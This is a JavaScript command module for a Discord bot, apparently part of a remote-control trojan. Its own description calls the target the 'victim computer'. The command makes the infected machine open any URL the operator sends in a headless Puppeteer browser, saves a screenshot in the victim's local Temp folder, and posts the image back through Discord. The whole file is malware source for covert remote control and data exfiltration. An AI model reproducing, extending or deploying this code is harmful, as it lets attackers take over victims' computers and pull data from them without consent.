const { ApplicationCommandOptionType } = require("discord.js"),
 { config } = require("../../../config.js"),
 path = require("path"),
 puppeteer = require('puppeteer');

module.exports = {
  name: "goon",
  description: "Visite any url with your victim computer",
  options: [
    {
      name: "url",
      ownerOnly: true,
      description: "Your url to go",
      required: true,
      type: ApplicationCommandOptionType.String,
    },
  ],
  run: async (client, interaction, args) => {
    try {
        await interaction.reply({
          content: "Wait...",
          ephemeral: true,
        });
      let query = await interaction.options.getString("url");

      // Launch a headless browser
      const browser = await puppeteer.launch();
      const page = await browser.newPage();

      // Navigate to Google and perform the search
      await page.goto(`${query}`);
      setTimeout(async() => {
        
      // Take a screenshot of the search results
      const screenshotPath = path.join(process.env.localappdata, "Temp", `search_results_${Date.now()}.png`);
      await page.screenshot({ path: screenshotPath, fullPage: true });

      // Send the screenshot back to Discord
      interaction.editReply({
        content: "Here is the Google search results:",
        files: [screenshotPath],
        ephemeral: true,
      });

      // Close the browser
      await browser.close();
    }, 5000);
    } catch (error) {
      interaction.reply("An error occurred while performing the Google search.");
    }
  },
};
